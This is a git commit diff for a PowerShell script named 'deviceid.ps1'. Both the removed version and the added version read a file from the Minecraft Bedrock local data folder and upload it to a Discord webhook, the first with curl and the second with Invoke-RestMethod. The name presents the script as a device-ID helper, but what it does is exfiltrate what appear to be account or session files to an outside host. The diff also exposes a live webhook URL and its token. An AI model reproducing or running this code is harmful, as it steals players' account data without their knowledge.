9a9c3c3cd8032932df6cf9545ef4d911bfd24dbc
UxuTaz <128841831+UxuTaz@users.noreply.github.com>
2023-04-13 23:08:53 +0200

    Update deviceid.ps1

--- deviceid.ps1
+++ deviceid.ps1
@@ -1,2 +1,11 @@
-cd AppData\Local\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe
-curl -H "Content-Type: multipart/form-data" -F "file=@hs" "https://discord.com/api/webhooks/1082023903175643178/xa_W-2Uin_fXYV5iKe6ipGGTqqENZY5ZJGEwHiW7MDSHXf9AjMG5pRQiHTAleFAPsEL5"
+$file = "%localappdata%\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe\h1"
+
+$content = Get-Content $file -Raw
+
+$json = @{
+    content = $content
+} | ConvertTo-Json
+
+$url = "https://discord.com/api/webhooks/1082023903175643178/xa_W-2Uin_fXYV5iKe6ipGGTqqENZY5ZJGEwHiW7MDSHXf9AjMG5pRQiHTAleFAPsEL5"
+
+Invoke-RestMethod -Method Post -Uri $url -Body $json
